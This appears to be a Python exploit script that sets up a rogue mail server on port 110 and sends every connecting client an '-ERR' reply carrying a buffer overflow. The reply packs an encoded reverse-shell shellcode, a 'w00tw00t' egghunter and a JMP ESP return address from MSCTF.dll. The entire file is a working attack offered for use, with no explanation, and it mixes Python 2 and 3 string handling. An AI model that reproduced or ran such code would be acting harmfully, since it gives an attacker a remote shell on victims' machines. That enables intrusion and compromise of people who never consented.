
import socket
import struct

revshell  = "w00tw00t"
revshell += b"\xd9\xcd\xbf\x34\x2a\x21\x39\xd9\x74\x24\xf4\x58"
revshell += b"\x31\xc9\xb1\x52\x31\x78\x17\x83\xc0\x04\x03\x4c"
revshell += b"\x39\xc3\xcc\x50\xd5\x81\x2f\xa8\x26\xe6\xa6\x4d"
revshell += b"\x17\x26\xdc\x06\x08\x96\x96\x4a\xa5\x5d\xfa\x7e"
revshell += b"\x3e\x13\xd3\x71\xf7\x9e\x05\xbc\x08\xb2\x76\xdf"
revshell += b"\x8a\xc9\xaa\x3f\xb2\x01\xbf\x3e\xf3\x7c\x32\x12"
revshell += b"\xac\x0b\xe1\x82\xd9\x46\x3a\x29\x91\x47\x3a\xce"
revshell += b"\x62\x69\x6b\x41\xf8\x30\xab\x60\x2d\x49\xe2\x7a"
revshell += b"\x32\x74\xbc\xf1\x80\x02\x3f\xd3\xd8\xeb\xec\x1a"
revshell += b"\xd5\x19\xec\x5b\xd2\xc1\x9b\x95\x20\x7f\x9c\x62"
revshell += b"\x5a\x5b\x29\x70\xfc\x28\x89\x5c\xfc\xfd\x4c\x17"
revshell += b"\xf2\x4a\x1a\x7f\x17\x4c\xcf\xf4\x23\xc5\xee\xda"
revshell += b"\xa5\x9d\xd4\xfe\xee\x46\x74\xa7\x4a\x28\x89\xb7"
revshell += b"\x34\x95\x2f\xbc\xd9\xc2\x5d\x9f\xb5\x27\x6c\x1f"
revshell += b"\x46\x20\xe7\x6c\x74\xef\x53\xfa\x34\x78\x7a\xfd"
revshell += b"\x3b\x53\x3a\x91\xc5\x5c\x3b\xb8\x01\x08\x6b\xd2"
revshell += b"\xa0\x31\xe0\x22\x4c\xe4\xa7\x72\xe2\x57\x08\x22"
revshell += b"\x42\x08\xe0\x28\x4d\x77\x10\x53\x87\x10\xbb\xae"
revshell += b"\x40\xdf\x94\xd4\xe5\xb7\xe6\x14\x17\x14\x6e\xf2"
revshell += b"\x7d\xb4\x26\xad\xe9\x2d\x63\x25\x8b\xb2\xb9\x40"
revshell += b"\x8b\x39\x4e\xb5\x42\xca\x3b\xa5\x33\x3a\x76\x97"
revshell += b"\x92\x45\xac\xbf\x79\xd7\x2b\x3f\xf7\xc4\xe3\x68"
revshell += b"\x50\x3a\xfa\xfc\x4c\x65\x54\xe2\x8c\xf3\x9f\xa6"
revshell += b"\x4a\xc0\x1e\x27\x1e\x7c\x05\x37\xe6\x7d\x01\x63"
revshell += b"\xb6\x2b\xdf\xdd\x70\x82\x91\xb7\x2a\x79\x78\x5f"
revshell += b"\xaa\xb1\xbb\x19\xb3\x9f\x4d\xc5\x02\x76\x08\xfa"
revshell += b"\xab\x1e\x9c\x83\xd1\xbe\x63\x5e\x52\xde\x81\x4a"
revshell += b"\xaf\x77\x1c\x1f\x12\x1a\x9f\xca\x51\x23\x1c\xfe"
revshell += b"\x29\xd0\x3c\x8b\x2c\x9c\xfa\x60\x5d\x8d\x6e\x86"
revshell += b"\xf2\xae\xba"

egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

crash = "\x90" * 10
crash += revshell
crash += "\x90" * (708 - len(crash))
crash += struct.pack("<I", 0x75d016e7) # Jmp ESP - C:\Windows\system32\MSCTF.dll
crash += "\x90" * 30
crash += egghunter
crash += "C" * (2000 - len(crash))

payload = "-ERR " + crash

# set up listener on port 110
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 110))
        s.listen(1)
        print ("[*] Listening on port 110.")
        print ("[*] Have someone connect to you.")
        print ("[*] Type <control>-c to exit.")
        conn, addr = s.accept()
        print '[*] Received connection from: ', addr

        while 1:
                conn.send(payload)
        conn.close()
except:
        print ("[*] Connection issue!")

